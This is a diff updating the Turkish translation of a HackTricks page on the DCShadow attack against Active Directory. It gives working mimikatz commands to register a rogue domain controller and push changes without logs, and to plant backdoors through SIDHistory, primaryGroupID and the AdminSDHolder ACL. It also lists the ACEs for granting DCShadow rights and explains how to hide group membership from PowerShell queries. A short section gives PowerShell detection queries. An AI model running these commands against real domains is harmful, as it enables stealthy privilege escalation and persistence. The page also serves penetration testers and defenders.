@@ -3,12 +3,12 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## Basic Information
+## Temel Bilgiler
 
-AD'ye bir **new Domain Controller** kaydeder ve belirtilen nesnelere (SIDHistory, SPNs...) üzerinde **push attributes** yapmak için kullanılır; yapılan **modifications** ile ilgili herhangi bir **logs** bırakmaz. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde olmanız gerekir.\
-Yanlış veri kullanırsanız oldukça çirkin **logs** oluşacağını unutmayın.
+AD ortamına **yeni bir Domain Controller** kaydeder ve bunu, herhangi bir **değişiklik** kaydı bırakmadan belirtilen nesnelerdeki **öznitelikleri** (SIDHistory, SPNs...) **push** etmek için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
+Yanlış veriler kullanırsanız oldukça kötü görünümlü loglar oluşacağını unutmayın.<sup>[[2]](#references)</sup>
 
-Saldırıyı gerçekleştirmek için 2 mimikatz instance'ına ihtiyacınız var. Bunlardan biri, yapmak istediğiniz değişiklikleri belirteceğiniz şekilde SYSTEM ayrıcalıklarıyla RPC sunucularını başlatacak (burada gerçekleştirmek istediğiniz değişiklikleri belirtmelisiniz), diğer instance ise değerleri push etmek için kullanılacak:
+Saldırıyı gerçekleştirmek için 2 mimikatz instance'ına ihtiyacınız vardır. Bunlardan biri SYSTEM ayrıcalıklarıyla RPC sunucularını başlatır (gerçekleştirmek istediğiniz değişiklikleri burada belirtmeniz gerekir), diğer instance ise değerleri push etmek için kullanılır:
 ```bash:mimikatz1 (RPC servers)
 !+
 !processtoken
@@ -18,26 +18,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```bash:mimikatz2 (push) - Needs DA or similar
 lsadump::dcshadow /push
 ```
-Dikkat edin ki **`elevate::token`** `mimikatz1` oturumunda çalışmaz çünkü bu iş parçacığının ayrıcalıklarını yükseltir; ancak bizim yükseltmemiz gereken **işlemin ayrıcalıkları**.\
-Ayrıca bir "LDAP" nesnesi de seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+`elevate::token` komutunun `mimikatz1` session'ında çalışmayacağını unutmayın; çünkü bu, thread'in ayrıcalıklarını yükseltir, ancak bizim process'in **privilege**'ını yükseltmemiz gerekir.\
+Ayrıca bir "LDAP" object seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Değişiklikleri bir DA'dan veya aşağıdaki asgari izinlere sahip bir kullanıcıdan gönderebilirsiniz:
+Değişiklikleri bir DA üzerinden veya aşağıdaki minimum izinlere sahip bir user üzerinden push edebilirsiniz:
 
-- **Etki alanı nesnesinde**:
-- _DS-Install-Replica_ (Etki Alanında Replika Ekle/Kaldır)
-- _DS-Replication-Manage-Topology_ (Replikasyon Topolojisini Yönetme)
-- _DS-Replication-Synchronize_ (Replikasyon Senkronizasyonu)
-- **Sites nesnesi** (ve alt öğeleri) **Yapılandırma kapsayıcısı** içinde:
+- **domain object** içinde:
+- _DS-Install-Replica_ (Add/Remove Replica in Domain)
+- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
+- _DS-Replication-Synchronize_ (Replication Synchornization)
+- **Configuration container** içindeki **Sites object** (ve child'ları):
 - _CreateChild and DeleteChild_
-- **DC olarak kaydedilmiş bilgisayarın** nesnesi:
-- _WriteProperty_ (Write değil)
-- **Hedef nesne**:
-- _WriteProperty_ (Write değil)
+- DC olarak kayıtlı olan **computer** object'i:
+- _WriteProperty_ (Not Write)
+- **target object**:
+- _WriteProperty_ (Not Write)
 
-Bu ayrıcalıkları yetkisiz bir kullanıcıya vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kullanabilirsiniz (bunun bazı kayıtlar bırakacağını unutmayın). Bu, DA ayrıcalıklarına sahip olmaktan çok daha kısıtlayıcıdır.\
-Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, kullanıcı adı _**student1**_ mcorp-student1 makinesinde oturum açtığında, _**root1user**_ nesnesi üzerinde DCShadow izinlerine sahip olduğu anlamına gelir.
+Ayrıcalıksız bir user'a bu izinleri vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kullanabilirsiniz (bunun bazı log'lar bırakacağını unutmayın). Bu, DA izinlerine sahip olmaktan çok daha kısıtlayıcıdır.\
+Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, _**student1**_ username'i _**mcorp-student1**_ makinesinde log on olduğunda **root1user** object'i üzerinde DCShadow izinlerine sahip olacağı anlamına gelir.
 
-## DCShadow kullanarak arka kapılar oluşturma
+## DCShadow kullanarak backdoor'lar oluşturma
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
@@ -52,17 +52,17 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
-### Birincil grup suistimali, keşif boşlukları ve tespit
+### Primary group abuse, enumeration gaps ve detection
 
-- `primaryGroupID` grup `member` listesinden ayrı bir özniteliktir. DCShadow/DSInternals bunu doğrudan yazabilir (ör. `primaryGroupID=512` olarak ayarlamak **Domain Admins** için) on-box LSASS denetimi olmadan, ancak AD yine de kullanıcıyı **taşır**: PGID'yi değiştirmek her zaman önceki birincil grubun üyeliğini kaldırır (herhangi bir hedef grup için aynı davranış), bu yüzden eski birincil grup üyeliğini koruyamazsınız.
-- Varsayılan araçlar kullanıcıyı mevcut birincil grubundan kaldırmayı engeller (`ADUC`, `Remove-ADGroupMember`), bu yüzden PGID'yi değiştirmek genellikle doğrudan dizin yazımı gerektirir (DCShadow/`Set-ADDBPrimaryGroup`).
-- Üyelik raporlaması tutarsızdır:
-  - **İçerir** birincil grup kaynaklı üyeleri: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
-  - **Hariç bırakır** birincil grup kaynaklı üyeleri: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
-- Özyinelemeli kontroller, **birincil grubun kendisi iç içe (nested) olması** durumunda birincil grup üyelerini atlayabilir (ör. kullanıcı PGID'si Domain Admins içinde iç içe bir gruba işaret ediyorsa); `Get-ADGroupMember -Recursive` veya LDAP özyinelemeli filtreleri, özyineleme açıkça birincil grupları çözmezse o kullanıcıyı döndürmez.
-- DACL hileleri: saldırganlar kullanıcıdaki `primaryGroupID` üzerine **deny ReadProperty** koyabilirler (veya non-AdminSDHolder gruplar için grup `member` özniteliği üzerinde), bu da etkili üyeliği çoğu PowerShell sorgusundan gizler; `net group` yine de üyeliği çözecektir. AdminSDHolder korumalı gruplar bu tür deny'leri sıfırlar.
+- `primaryGroupID`, grup `member` listesinden ayrı bir attribute'tur. DCShadow/DSInternals bunu doğrudan yazabilir (örneğin **Domain Admins** için `primaryGroupID=512` ayarlayabilir); on-box LSASS enforcement olmadan bunu gerçekleştirebilir. Ancak AD kullanıcıyı yine de **taşır**: PGID değiştirildiğinde kullanıcı önceki primary group üyeliğinden her zaman çıkarılır (hedef grup ne olursa olsun aynı davranış geçerlidir); dolayısıyla eski primary-group üyeliğini koruyamazsınız.<sup>[[1]](#references)</sup>
+- Varsayılan araçlar bir kullanıcının mevcut primary group'undan çıkarılmasını engeller (`ADUC`, `Remove-ADGroupMember`); bu nedenle PGID değişikliği genellikle doğrudan directory write işlemleri gerektirir (DCShadow/`Set-ADDBPrimaryGroup`).
+- Membership reporting tutarsızdır:
+- **Primary-group-derived üyeleri içerir:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
+- **Primary-group-derived üyeleri içermez:** `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit ile `member` incelenmesi, `Get-ADUser <user> -Properties memberOf`.
+- Recursive kontroller, **primary group** kendisi nested olduğunda primary-group üyelerini gözden kaçırabilir (örneğin kullanıcının PGID'si Domain Admins içindeki nested bir grubu gösteriyorsa); `Get-ADGroupMember -Recursive` veya LDAP recursive filter'ları, recursion primary group'ları açıkça çözümlemediği sürece bu kullanıcıyı döndürmez.
+- DACL tricks: attacker'lar user üzerinde `primaryGroupID` için (veya AdminSDHolder kapsamındaki gruplar dışındaki gruplarda `member` attribute'u için) **ReadProperty** iznini deny ederek effective membership bilgisini çoğu PowerShell query'sinden gizleyebilir; `net group` membership'i yine de çözümler. AdminSDHolder tarafından korunan gruplar bu deny'ları sıfırlar.
 
-Tespit/izleme örnekleri:
+Detection/monitoring örnekleri:
 ```powershell
 # Find users whose primary group is not the default Domain Users (RID 513)
 Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
@@ -76,29 +76,29 @@ Get-ADUser -Filter * -Properties primaryGroupID |
 Where-Object { -not $_.primaryGroupID } |
 Select-Object Name,SamAccountName
 ```
-Ayrıcalıklı grupları, `Get-ADGroupMember` çıktısını `Get-ADGroup -Properties member` ile veya ADSI Edit ile karşılaştırarak `primaryGroupID` veya gizli özniteliklerin neden olduğu tutarsızlıkları yakalayın.
+Privileged groups'u, `Get-ADGroupMember` çıktısını `Get-ADGroup -Properties member` veya ADSI Edit ile karşılaştırarak cross-check edin; böylece `primaryGroupID` ya da gizli attributes nedeniyle oluşan tutarsızlıkları yakalayabilirsiniz.<sup>[[1]](#references)</sup>
 
-## Shadowception - DCShadow izinlerini DCShadow kullanarak verin (no modified permissions logs)
+## Shadowception - DCShadow kullanarak DCShadow permissions verme (modified permissions logs olmadan)
 
-Sona kullanıcı SID'imizi ekleyerek aşağıdaki ACE'leri eklememiz gerekiyor:
+Kullanıcımızın SID'siyle aşağıdaki ACE'leri sona eklememiz gerekiyor:<sup>[[2]](#references)</sup>
 
-- Domain nesnesinde:
+- Domain object üzerinde:
 - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
 - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
 - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-- Saldırgan bilgisayar nesnesinde: `(A;;WP;;;UserSID)`
-- Hedef kullanıcı nesnesinde: `(A;;WP;;;UserSID)`
-- Configuration container içindeki Sites nesnesinde: `(A;CI;CCDC;;;UserSID)`
+- Attacker computer object üzerinde: `(A;;WP;;;UserSID)`
+- Target user object üzerinde: `(A;;WP;;;UserSID)`
+- Configuration container içindeki Sites object üzerinde: `(A;CI;CCDC;;;UserSID)`
 
-Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Bir object'in mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
 
-Dikkat edin ki bu durumda **birden fazla değişiklik,** sadece bir tane değil. Bu yüzden **mimikatz1 oturumu** (RPC server) içinde yapmak istediğiniz her değişiklik için **`/stack` ile her değişiklik** parametresini kullanın. Bu şekilde, tüm bekleyen değişiklikleri rogue sunucuda uygulamak için sadece bir kez **`/push`** yapmanız yeterli olacaktır.
+Bu durumda yalnızca bir değil, **birkaç değişiklik** yapmanız gerektiğine dikkat edin. Bu nedenle **mimikatz1 session**'ında (RPC server), yapmak istediğiniz her değişiklikle birlikte **`/stack` parametresini** kullanın. Böylece rogue server'da biriken tüm değişiklikleri gerçekleştirmek için yalnızca bir kez **`/push`** kullanmanız yeterli olacaktır.
 
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**ired.team'de DCShadow hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 ## References
 
-- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
-- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
+- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {{#include ../../banners/hacktricks-training.md}}
